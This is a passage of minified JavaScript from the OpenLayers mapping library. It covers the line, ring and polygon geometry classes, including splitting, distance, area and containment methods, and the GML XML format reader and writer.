b},getSortedSegments:function(){for(var a=this.components.length-1,b=Array(a),c,d,e=0;e<a;++e)c=this.components[e],d=this.components[e+1],b[e]=c.x<d.x?{x1:c.x,y1:c.y,x2:d.x,y2:d.y}:\n{x1:d.x,y1:d.y,x2:c.x,y2:c.y};return b.sort(function(a,b){return a.x1-b.x1})},splitWithSegment:function(a,b){for(var c=!(b&&!1===b.edge),d=b&&b.tolerance,e=[],f=this.getVertices(),g=[],h=[],k=!1,l,m,n,p={point:!0,tolerance:d},q=null,r=0,s=f.length-2;r<=s;++r)if(d=f[r],g.push(d.clone()),l=f[r+1],m={x1:d.x,y1:d.y,x2:l.x,y2:l.y},m=OpenLayers.Geometry.segmentsIntersect(a,m,p),m instanceof OpenLayers.Geometry.Point&&((n=m.x===a.x1&&m.y===a.y1||m.x===a.x2&&m.y===a.y2||m.equals(d)||m.equals(l)?!0:!1)||c))m.equals(h[h.length-\n1])||h.push(m.clone()),0===r&&m.equals(d)||m.equals(l)||(k=!0,m.equals(d)||g.push(m),e.push(new OpenLayers.Geometry.LineString(g)),g=[m.clone()]);k&&(g.push(l.clone()),e.push(new OpenLayers.Geometry.LineString(g)));if(0<h.length)var t=a.x1<a.x2?1:-1,u=a.y1<a.y2?1:-1,q={lines:e,points:h.sort(function(a,b){return t*a.x-t*b.x||u*a.y-u*b.y})};return q},split:function(a,b){var c=null,d=b&&b.mutual,e,f,g,h;if(a instanceof OpenLayers.Geometry.LineString){var k=this.getVertices(),l,m,n,p,q,r=[];g=[];for(var s=\n0,t=k.length-2;s<=t;++s){l=k[s];m=k[s+1];n={x1:l.x,y1:l.y,x2:m.x,y2:m.y};h=h||[a];d&&r.push(l.clone());for(var u=0;u<h.length;++u)if(p=h[u].splitWithSegment(n,b))if(q=p.lines,0<q.length&&(q.unshift(u,1),Array.prototype.splice.apply(h,q),u+=q.length-2),d)for(var v=0,w=p.points.length;v<w;++v)q=p.points[v],q.equals(l)||(r.push(q),g.push(new OpenLayers.Geometry.LineString(r)),r=q.equals(m)?[]:[q.clone()])}d&&(0<g.length&&0<r.length)&&(r.push(m.clone()),g.push(new OpenLayers.Geometry.LineString(r)))}else c=\na.splitWith(this,b);h&&1<h.length?f=!0:h=[];g&&1<g.length?e=!0:g=[];if(f||e)c=d?[g,h]:h;return c},splitWith:function(a,b){return a.split(this,b)},getVertices:function(a){return!0===a?[this.components[0],this.components[this.components.length-1]]:!1===a?this.components.slice(1,this.components.length-1):this.components.slice()},distanceTo:function(a,b){var c=!(b&&!1===b.edge)&&b&&b.details,d,e={},f=Number.POSITIVE_INFINITY;if(a instanceof OpenLayers.Geometry.Point){for(var g=this.getSortedSegments(),\nh=a.x,k=a.y,l,m=0,n=g.length;m<n;++m)if(l=g[m],d=OpenLayers.Geometry.distanceToSegment(a,l),d.distance<f){if(f=d.distance,e=d,0===f)break}else if(l.x2>h&&(k>l.y1&&k<l.y2||k<l.y1&&k>l.y2))break;e=c?{distance:e.distance,x0:e.x,y0:e.y,x1:h,y1:k}:e.distance}else if(a instanceof OpenLayers.Geometry.LineString){var g=this.getSortedSegments(),h=a.getSortedSegments(),p,q,r=h.length,s={point:!0},m=0,n=g.length;a:for(;m<n;++m){k=g[m];l=k.x1;q=k.y1;for(var t=0;t<r;++t)if(d=h[t],p=OpenLayers.Geometry.segmentsIntersect(k,\nd,s)){f=0;e={distance:0,x0:p.x,y0:p.y,x1:p.x,y1:p.y};break a}else d=OpenLayers.Geometry.distanceToSegment({x:l,y:q},d),d.distance<f&&(f=d.distance,e={distance:f,x0:l,y0:q,x1:d.x,y1:d.y})}c||(e=e.distance);0!==f&&k&&(d=a.distanceTo(new OpenLayers.Geometry.Point(k.x2,k.y2),b),m=c?d.distance:d,m<f&&(e=c?{distance:f,x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0}:m))}else e=a.distanceTo(this,b),c&&(e={distance:e.distance,x0:e.x1,y0:e.y1,x1:e.x0,y1:e.y0});return e},simplify:function(a){if(this&&null!==this){var b=this.getVertices();\nif(3>b.length)return this;var c=function(a,b,d,k){for(var l=0,m=0,n=b,p;n<d;n++){p=a[b];var q=a[d],r=a[n],r=Math.abs(0.5*(p.x*q.y+q.x*r.y+r.x*p.y-q.x*p.y-r.x*q.y-p.x*r.y));p=Math.sqrt(Math.pow(p.x-q.x,2)+Math.pow(p.y-q.y,2));p=2*(r/p);p>l&&(l=p,m=n)}l>k&&m!=b&&(e.push(m),c(a,b,m,k),c(a,m,d,k))},d=b.length-1,e=[];e.push(0);for(e.push(d);b[0].equals(b[d]);)d--,e.push(d);c(b,0,d,a);a=[];e.sort(function(a,b){return a-b});for(d=0;d<e.length;d++)a.push(b[e[d]]);return new OpenLayers.Geometry.LineString(a)}return this},\nCLASS_NAME:\"OpenLayers.Geometry.LineString\"});OpenLayers.Geometry.MultiLineString=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:[\"OpenLayers.Geometry.LineString\"],split:function(a,b){for(var c=null,d=b&&b.mutual,e,f,g,h,k=[],l=[a],m=0,n=this.components.length;m<n;++m){f=this.components[m];g=!1;for(var p=0;p<l.length;++p)if(e=f.split(l[p],b)){if(d){g=e[0];for(var q=0,r=g.length;q<r;++q)0===q&&k.length?k[k.length-1].addComponent(g[q]):k.push(new OpenLayers.Geometry.MultiLineString([g[q]]));g=!0;e=e[1]}if(e.length){e.unshift(p,\n1);Array.prototype.splice.apply(l,e);break}}g||(k.length?k[k.length-1].addComponent(f.clone()):k=[new OpenLayers.Geometry.MultiLineString(f.clone())])}k&&1<k.length?g=!0:k=[];l&&1<l.length?h=!0:l=[];if(g||h)c=d?[k,l]:l;return c},splitWith:function(a,b){var c=null,d=b&&b.mutual,e,f,g,h,k,l;if(a instanceof OpenLayers.Geometry.LineString){l=[];k=[a];for(var m=0,n=this.components.length;m<n;++m){g=!1;f=this.components[m];for(var p=0;p<k.length;++p)if(e=k[p].split(f,b)){d&&(g=e[0],g.length&&(g.unshift(p,\n1),Array.prototype.splice.apply(k,g),p+=g.length-2),e=e[1],0===e.length&&(e=[f.clone()]));g=0;for(var q=e.length;g<q;++g)0===g&&l.length?l[l.length-1].addComponent(e[g]):l.push(new OpenLayers.Geometry.MultiLineString([e[g]]));g=!0}g||(l.length?l[l.length-1].addComponent(f.clone()):l=[new OpenLayers.Geometry.MultiLineString([f.clone()])])}}else c=a.split(this);k&&1<k.length?h=!0:k=[];l&&1<l.length?g=!0:l=[];if(h||g)c=d?[k,l]:l;return c},CLASS_NAME:\"OpenLayers.Geometry.MultiLineString\"});OpenLayers.Geometry.LinearRing=OpenLayers.Class(OpenLayers.Geometry.LineString,{componentTypes:[\"OpenLayers.Geometry.Point\"],addComponent:function(a,b){var c=!1,d=this.components.pop();null==b&&a.equals(d)||(c=OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,arguments));OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]);return c},removeComponent:function(a){var b=this.components&&3<this.components.length;b&&(this.components.pop(),OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,\narguments),OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]));return b},move:function(a,b){for(var c=0,d=this.components.length;c<d-1;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c<d-1;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0,e=this.components.length;d<e-1;++d)this.components[d].resize(a,b,c);return this},transform:function(a,b){if(a&&b){for(var c=0,d=this.components.length;c<d-1;c++)this.components[c].transform(a,\nb);this.bounds=null}return this},getCentroid:function(){if(this.components){var a=this.components.length;if(0<a&&2>=a)return this.components[0].clone();if(2<a){var b=0,c=0,d=this.components[0].x,e=this.components[0].y,f=-1*this.getArea();if(0!=f){for(var g=0;g<a-1;g++)var h=this.components[g],k=this.components[g+1],b=b+(h.x+k.x-2*d)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e)),c=c+(h.y+k.y-2*e)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e));b=d+b/(6*f);a=e+c/(6*f)}else{for(g=0;g<a-1;g++)b+=this.components[g].x,c+=this.components[g].y;\nb/=a-1;a=c/(a-1)}return new OpenLayers.Geometry.Point(b,a)}return null}},getArea:function(){var a=0;if(this.components&&2<this.components.length){for(var b=a=0,c=this.components.length;b<c-1;b++)var d=this.components[b],e=this.components[b+1],a=a+(d.x+e.x)*(e.y-d.y);a=-a/2}return a},getGeodesicArea:function(a){var b=this;if(a){var c=new OpenLayers.Projection(\"EPSG:4326\");c.equals(a)||(b=this.clone().transform(a,c))}a=0;c=b.components&&b.components.length;if(2<c){for(var d,e,f=0;f<c-1;f++)d=b.components[f],\ne=b.components[f+1],a+=OpenLayers.Util.rad(e.x-d.x)*(2+Math.sin(OpenLayers.Util.rad(d.y))+Math.sin(OpenLayers.Util.rad(e.y)));a=40680631590769*a/2}return a},containsPoint:function(a){var b=OpenLayers.Number.limitSigDigs,c=b(a.x,14);a=b(a.y,14);for(var d=this.components.length-1,e,f,g,h,k,l=0,m=0;m<d;++m)if(e=this.components[m],g=b(e.x,14),e=b(e.y,14),f=this.components[m+1],h=b(f.x,14),f=b(f.y,14),e==f){if(a==e&&(g<=h&&c>=g&&c<=h||g>=h&&c<=g&&c>=h)){l=-1;break}}else{k=b((a-f)*((h-g)/(f-e))+h,14);if(k==\nc&&(e<f&&a>=e&&a<=f||e>f&&a<=e&&a>=f)){l=-1;break}k<=c||g!=h&&(k<Math.min(g,h)||k>Math.max(g,h))||(e<f&&a>=e&&a<f||e>f&&a<e&&a>=f)&&++l}return-1==l?1:!!(l&1)},intersects:function(a){var b=!1;if(\"OpenLayers.Geometry.Point\"==a.CLASS_NAME)b=this.containsPoint(a);else if(\"OpenLayers.Geometry.LineString\"==a.CLASS_NAME)b=a.intersects(this);else if(\"OpenLayers.Geometry.LinearRing\"==a.CLASS_NAME)b=OpenLayers.Geometry.LineString.prototype.intersects.apply(this,[a]);else for(var c=0,d=a.components.length;c<\nd&&!(b=a.components[c].intersects(this));++c);return b},getVertices:function(a){return!0===a?[]:this.components.slice(0,this.components.length-1)},CLASS_NAME:\"OpenLayers.Geometry.LinearRing\"});OpenLayers.Geometry.Polygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:[\"OpenLayers.Geometry.LinearRing\"],getArea:function(){var a=0;if(this.components&&0<this.components.length)for(var a=a+Math.abs(this.components[0].getArea()),b=1,c=this.components.length;b<c;b++)a-=Math.abs(this.components[b].getArea());return a},getGeodesicArea:function(a){var b=0;if(this.components&&0<this.components.length)for(var b=b+Math.abs(this.components[0].getGeodesicArea(a)),c=1,d=this.components.length;c<\nd;c++)b-=Math.abs(this.components[c].getGeodesicArea(a));return b},containsPoint:function(a){var b=this.components.length,c=!1;if(0<b&&(c=this.components[0].containsPoint(a),1!==c&&c&&1<b))for(var d,e=1;e<b;++e)if(d=this.components[e].containsPoint(a)){c=1===d?1:!1;break}return c},intersects:function(a){var b=!1,c,d;if(\"OpenLayers.Geometry.Point\"==a.CLASS_NAME)b=this.containsPoint(a);else if(\"OpenLayers.Geometry.LineString\"==a.CLASS_NAME||\"OpenLayers.Geometry.LinearRing\"==a.CLASS_NAME){c=0;for(d=\nthis.components.length;c<d&&!(b=a.intersects(this.components[c]));++c);if(!b)for(c=0,d=a.components.length;c<d&&!(b=this.containsPoint(a.components[c]));++c);}else for(c=0,d=a.components.length;c<d&&!(b=this.intersects(a.components[c]));++c);if(!b&&\"OpenLayers.Geometry.Polygon\"==a.CLASS_NAME){var e=this.components[0];c=0;for(d=e.components.length;c<d&&!(b=a.containsPoint(e.components[c]));++c);}return b},distanceTo:function(a,b){return b&&!1===b.edge&&this.intersects(a)?0:OpenLayers.Geometry.Collection.prototype.distanceTo.apply(this,\n[a,b])},CLASS_NAME:\"OpenLayers.Geometry.Polygon\"});OpenLayers.Geometry.Polygon.createRegularPolygon=function(a,b,c,d){var e=Math.PI*(1/c-0.5);d&&(e+=d/180*Math.PI);for(var f,g=[],h=0;h<c;++h)f=e+2*h*Math.PI/c,d=a.x+b*Math.cos(f),f=a.y+b*Math.sin(f),g.push(new OpenLayers.Geometry.Point(d,f));a=new OpenLayers.Geometry.LinearRing(g);return new OpenLayers.Geometry.Polygon([a])};OpenLayers.Geometry.MultiPolygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:[\"OpenLayers.Geometry.Polygon\"],CLASS_NAME:\"OpenLayers.Geometry.MultiPolygon\"});OpenLayers.Format.GML=OpenLayers.Class(OpenLayers.Format.XML,{featureNS:\"http://mapserver.gis.umn.edu/mapserver\",featurePrefix:\"feature\",featureName:\"featureMember\",layerName:\"features\",geometryName:\"geometry\",collectionName:\"FeatureCollection\",gmlns:\"http://www.opengis.net/gml\",extractAttributes:!0,xy:!0,initialize:function(a){this.regExes={trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g};OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){\"string\"==\ntypeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=this.getElementsByTagNameNS(a.documentElement,this.gmlns,this.featureName);for(var b=[],c=0;c<a.length;c++){var d=this.parseFeature(a[c]);d&&b.push(d)}return b},parseFeature:function(a){for(var b=\"MultiPolygon Polygon MultiLineString LineString MultiPoint Point Envelope\".split(\" \"),c,d,e,f=0;f<b.length;++f)if(c=b[f],d=this.getElementsByTagNameNS(a,this.gmlns,c),0<d.length){if(e=this.parseGeometry[c.toLowerCase()])e=e.apply(this,\n[d[0]]),this.internalProjection&&this.externalProjection&&e.transform(this.externalProjection,this.internalProjection);else throw new TypeError(\"Unsupported geometry type: \"+c);break}var g;c=this.getElementsByTagNameNS(a,this.gmlns,\"Box\");for(f=0;f<c.length;++f)b=c[f],d=this.parseGeometry.box.apply(this,[b]),b=b.parentNode,\"boundedBy\"===(b.localName||b.nodeName.split(\":\").pop())?g=d:e=d.toGeometry();var h;this.extractAttributes&&(h=this.parseAttributes(a));h=new OpenLayers.Feature.Vector(e,h);h.bounds=\ng;h.gml={featureType:a.firstChild.nodeName.split(\":\")[1],featureNS:a.firstChild.namespaceURI,featureNSPrefix:a.firstChild.prefix};a=a.firstChild;for(var k;a&&(1!=a.nodeType||!(k=a.getAttribute(\"fid\")||a.getAttribute(\"id\")));)a=a.nextSibling;h.fid=k;return h},parseGeometry:{point:function(a){var b,c;c=[];b=this.getElementsByTagNameNS(a,this.gmlns,\"pos\");0<b.length&&(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,\"\"),c=c.split(this.regExes.splitSpace));0==c.length&&(b=this.getElementsByTagNameNS(a,\nthis.gmlns,\"coordinates\"),0<b.length&&(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.removeSpace,\"\"),c=c.split(\",\")));0==c.length&&(b=this.getElementsByTagNameNS(a,this.gmlns,\"coord\"),0<b.length&&(a=this.getElementsByTagNameNS(b[0],this.gmlns,\"X\"),b=this.getElementsByTagNameNS(b[0],this.gmlns,\"Y\"),0<a.length&&0<b.length&&(c=[a[0].firstChild.nodeValue,b[0].firstChild.nodeValue])));2==c.length&&(c[2]=null);return this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],\nc[0],c[2])},multipoint:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,\"Point\");var b=[];if(0<a.length)for(var c,d=0;d<a.length;++d)(c=this.parseGeometry.point.apply(this,[a[d]]))&&b.push(c);return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a,b){var c,d;d=[];var e=[];c=this.getElementsByTagNameNS(a,this.gmlns,\"posList\");if(0<c.length){d=this.getChildValue(c[0]);d=d.replace(this.regExes.trimSpace,\"\");d=d.split(this.regExes.splitSpace);var f=parseInt(c[0].getAttribute(\"dimension\")),\ng,h,k;for(c=0;c<d.length/f;++c)g=c*f,h=d[g],k=d[g+1],g=2==f?null:d[g+2],this.xy?e.push(new OpenLayers.Geometry.Point(h,k,g)):e.push(new OpenLayers.Geometry.Point(k,h,g))}if(0==d.length&&(c=this.getElementsByTagNameNS(a,this.gmlns,\"coordinates\"),0<c.length))for(d=this.getChildValue(c[0]),d=d.replace(this.regExes.trimSpace,\"\"),d=d.replace(this.regExes.trimComma,\",\"),f=d.split(this.regExes.splitSpace),c=0;c<f.length;++c)d=f[c].split(\",\"),2==d.length&&(d[2]=null),this.xy?e.push(new OpenLayers.Geometry.Point(d[0],\nd[1],d[2])):e.push(new OpenLayers.Geometry.Point(d[1],d[0],d[2]));d=null;0!=e.length&&(d=b?new OpenLayers.Geometry.LinearRing(e):new OpenLayers.Geometry.LineString(e));return d},multilinestring:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,\"LineString\");var b=[];if(0<a.length)for(var c,d=0;d<a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d]]))&&b.push(c);return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,\"LinearRing\");\nvar b=[];if(0<a.length)for(var c,d=0;d<a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d],!0]))&&b.push(c);return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,\"Polygon\");var b=[];if(0<a.length)for(var c,d=0;d<a.length;++d)(c=this.parseGeometry.polygon.apply(this,[a[d]]))&&b.push(c);return new OpenLayers.Geometry.MultiPolygon(b)},envelope:function(a){var b=[],c,d,e=this.getElementsByTagNameNS(a,this.gmlns,\"lowerCorner\");if(0<e.length){c=\n[];0<e.length&&(c=e[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,\"\"),c=c.split(this.regExes.splitSpace));2==c.length&&(c[2]=null);var f=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}a=this.getElementsByTagNameNS(a,this.gmlns,\"upperCorner\");if(0<a.length){c=[];0<a.length&&(c=a[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,\"\"),c=c.split(this.regExes.splitSpace));2==c.length&&(c[2]=null);var g=this.xy?new OpenLayers.Geometry.Point(c[0],\nc[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}f&&g&&(b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b=new OpenLayers.Geometry.LinearRing(b),d=new OpenLayers.Geometry.Polygon([b]));return d},box:function(a){var b=this.getElementsByTagNameNS(a,this.gmlns,\"coordinates\"),c=a=null;0<b.length&&(b=b[0].firstChild.nodeValue,\nb=b.split(\" \"),2==b.length&&(a=b[0].split(\",\"),c=b[1].split(\",\")));if(null!==a&&null!==c)return new OpenLayers.Bounds(parseFloat(a[0]),parseFloat(a[1]),parseFloat(c[0]),parseFloat(c[1]))}},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d,e;a;){if(1==a.nodeType){a=a.childNodes;for(c=0;c<a.length;++c)if(d=a[c],1==d.nodeType)if(e=d.childNodes,1==e.length){if(e=e[0],3==e.nodeType||4==e.nodeType)d=d.prefix?d.nodeName.split(\":\")[1]:d.nodeName,e=e.nodeValue.replace(this.regExes.trimSpace,\n\"\"),b[d]=e}else b[d.nodeName.split(\":\").pop()]=null;break}a=a.nextSibling}return b},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS(\"http://www.opengis.net/wfs\",\"wfs:\"+this.collectionName),c=0;c<a.length;c++)b.appendChild(this.createFeatureXML(a[c]));return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,this.featurePrefix+\":\"+this.geometryName);c.appendChild(b);\nvar b=this.createElementNS(this.gmlns,\"gml:\"+this.featureName),d=this.createElementNS(this.featureNS,this.featurePrefix+\":\"+this.layerName);d.setAttribute(\"fid\",a.fid||a.id);d.appendChild(c);for(var e in a.attributes){var c=this.createTextNode(a.attributes[e]),f=e.substring(e.lastIndexOf(\":\")+1),f=this.createElementNS(this.featureNS,this.featurePrefix+\":\"+f);f.appendChild(c);d.appendChild(f)}b.appendChild(d);return b},buildGeometryNode:function(a){this.externalProjection&&this.internalProjection&&\n(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(\".\")+1);return this.buildGeometry[b.toLowerCase()].apply(this,[a])},buildGeometry:{point:function(a){var b=this.createElementNS(this.gmlns,\"gml:Point\");b.appendChild(this.buildCoordinatesNode(a));return b},multipoint:function(a){var b=this.createElementNS(this.gmlns,\"gml:MultiPoint\");a=a.components;for(var c,d,e=0;e<a.length;e++)c=this.createElementNS(this.gmlns,\"gml:pointMember\"),\nd=this.buildGeometry.point.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},linestring:function(a){var b=this.createElementNS(this.gmlns,\"gml:LineString\");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){var b=this.createElementNS(this.gmlns,\"gml:MultiLineString\");a=a.components;for(var c,d,e=0;e<a.length;++e)c=this.createElementNS(this.gmlns,\"gml:lineStringMember\"),d=this.buildGeometry.linestring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);\nreturn b},linearring:function(a){var b=this.createElementNS(this.gmlns,\"gml:LinearRing\");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.gmlns,\"gml:Polygon\");a=a.components;for(var c,d,e=0;e<a.length;++e)c=0==e?\"outerBoundaryIs\":\"innerBoundaryIs\",c=this.createElementNS(this.gmlns,\"gml:\"+c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){var b=this.createElementNS(this.gmlns,\n\"gml:MultiPolygon\");a=a.components;for(var c,d,e=0;e<a.length;++e)c=this.createElementNS(this.gmlns,\"gml:polygonMember\"),d=this.buildGeometry.polygon.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},bounds:function(a){var b=this.createElementNS(this.gmlns,\"gml:Box\");b.appendChild(this.buildCoordinatesNode(a));return b}},buildCoordinatesNode:function(a){var b=this.createElementNS(this.gmlns,\"gml:coordinates\");b.setAttribute(\"decimal\",\".\");b.setAttribute(\"cs\",\",\");b.setAttribute(\"ts\",\n\" \");var c=[];if(a instanceof OpenLayers.Bounds)c.push(a.left+\",\"+a.bottom),c.push(a.right+\",\"+a.top);else{a=a.components?a.components:[a];for(var d=0;d<a.length;d++)c.push(a[d].x+\",\"+a[d].y)}c=this.createTextNode(c.join(\" \"));b.appendChild(c);return b},CLASS_NAME:\"OpenLayers.Format.GML\"});OpenLayers.Format.GML||(OpenLayers.Format.GML={});\nOpenLayers.Format.GML.Base=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{gml:\"http://www.opengis.net/gml\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",wfs:\"http://www.opengis.net/wfs\"},defaultPrefix:\"gml\",schemaLocation:null,featureType:null,featureNS:null,geometryName:\"geometry\",extractAttributes:!0,srsName:null,xy:!0,geometryTypes:null,singleFeatureType:null,regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g,featureMember:/^(.*:)?featureMembers?$/},\ninitialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.setGeometryTypes();a&&a.featureNS&&this.setNamespace(\"feature\",a.featureNS);this.singleFeatureType=!a||\"string\"===typeof a.featureType},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b=[];this.readNode(a,{features:b},!0);if(0==b.length){var c=this.getElementsByTagNameNS(a,this.namespaces.gml,\"featureMember\");if(c.length){a=\n0;for(var d=c.length;a<d;++a)this.readNode(c[a],{features:b},!0)}else c=this.getElementsByTagNameNS(a,this.namespaces.gml,\"featureMembers\"),c.length&&this.readNode(c[0],{features:b},!0)}return b},readNode:function(a,b,c){!0===c&&!0===this.autoConfig&&(this.featureType=null,delete this.namespaceAlias[this.featureNS],delete this.namespaces.feature,this.featureNS=null);this.featureNS||(a.prefix in this.namespaces||a.parentNode.namespaceURI!=this.namespaces.gml||!this.regExes.featureMember.test(a.parentNode.nodeName))||\n(this.featureType=a.nodeName.split(\":\").pop(),this.setNamespace(\"feature\",a.namespaceURI),this.featureNS=a.namespaceURI,this.autoConfig=!0);return OpenLayers.Format.XML.prototype.readNode.apply(this,[a,b])},readers:{gml:{_inherit:function(a,b,c){},featureMember:function(a,b){this.readChildNodes(a,b)},featureMembers:function(a,b){this.readChildNodes(a,b)},name:function(a,b){b.name=this.getChildValue(a)},boundedBy:function(a,b){var c={};this.readChildNodes(a,c);c.components&&0<c.components.length&&\n(b.bounds=c.components[0])},Point:function(a,b){var c={points:[]};this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(c.points[0])},coordinates:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\"),c=c.replace(this.regExes.trimComma,\",\"),c=c.split(this.regExes.splitSpace),d,e=c.length,f=Array(e),g=0;g<e;++g)d=c[g].split(\",\"),f[g]=this.xy?new OpenLayers.Geometry.Point(d[0],d[1],d[2]):new OpenLayers.Geometry.Point(d[1],d[0],d[2]);b.points=f},coord:function(a,\nb){var c={};this.readChildNodes(a,c);b.points||(b.points=[]);b.points.push(new OpenLayers.Geometry.Point(c.x,c.y,c.z))},X:function(a,b){b.x=this.getChildValue(a)},Y:function(a,b){b.y=this.getChildValue(a)},Z:function(a,b){b.z=this.getChildValue(a)},MultiPoint:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPoint(c.components)]},pointMember:function(a,b){this.readChildNodes(a,b)},LineString:function(a,\nb){var c={};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},MultiLineString:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiLineString(c.components)]},lineStringMember:function(a,b){this.readChildNodes(a,b)},Polygon:function(a,b){var c={outer:null,inner:[]};this.readers.gml._inherit.apply(this,\n[a,c,b]);this.readChildNodes(a,c);c.inner.unshift(c.outer);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.Polygon(c.inner))},LinearRing:function(a,b){var c={};this.readers.gml._inherit.apply(this,[a,c]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.LinearRing(c.points)]},MultiPolygon:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)]},\npolygonMember:function(a,b){this.readChildNodes(a,b)},GeometryCollection:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.Collection(c.components)]},geometryMember:function(a,b){this.readChildNodes(a,b)}},feature:{\"*\":function(a,b){var c,d=a.localName||a.nodeName.split(\":\").pop();b.features?this.singleFeatureType||-1===OpenLayers.Util.indexOf(this.featureType,d)?d===this.featureType&&(c=\"_typeName\"):c=\n\"_typeName\":0==a.childNodes.length||1==a.childNodes.length&&3==a.firstChild.nodeType?this.extractAttributes&&(c=\"_attribute\"):c=\"_geometry\";c&&this.readers.feature[c].apply(this,[a,b])},_typeName:function(a,b){var c={components:[],attributes:{}};this.readChildNodes(a,c);c.name&&(c.attributes.name=c.name);var d=new OpenLayers.Feature.Vector(c.components[0],c.attributes);this.singleFeatureType||(d.type=a.nodeName.split(\":\").pop(),d.namespace=a.namespaceURI);var e=a.getAttribute(\"fid\")||this.getAttributeNS(a,\nthis.namespaces.gml,\"id\");e&&(d.fid=e);this.internalProjection&&(this.externalProjection&&d.geometry)&&d.geometry.transform(this.externalProjection,this.internalProjection);c.bounds&&(d.bounds=c.bounds);b.features.push(d)},_geometry:function(a,b){this.geometryName||(this.geometryName=a.nodeName.split(\":\").pop());this.readChildNodes(a,b)},_attribute:function(a,b){var c=a.localName||a.nodeName.split(\":\").pop(),d=this.getChildValue(a);b.attributes[c]=d}},wfs:{FeatureCollection:function(a,b){this.readChildNodes(a,\nb)}}},write:function(a){var b;b=OpenLayers.Util.isArray(a)?\"featureMembers\":\"featureMember\";a=this.writeNode(\"gml:\"+b,a);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:{featureMember:function(a){var b=this.createElementNSPlus(\"gml:featureMember\");this.writeNode(\"feature:_typeName\",a,b);return b},MultiPoint:function(a){var b=this.createElementNSPlus(\"gml:MultiPoint\");a=a.components||[a];\nfor(var c=0,d=a.length;c<d;++c)this.writeNode(\"pointMember\",a[c],b);return b},pointMember:function(a){var b=this.createElementNSPlus(\"gml:pointMember\");this.writeNode(\"Point\",a,b);return b},MultiLineString:function(a){var b=this.createElementNSPlus(\"gml:MultiLineString\");a=a.components||[a];for(var c=0,d=a.length;c<d;++c)this.writeNode(\"lineStringMember\",a[c],b);return 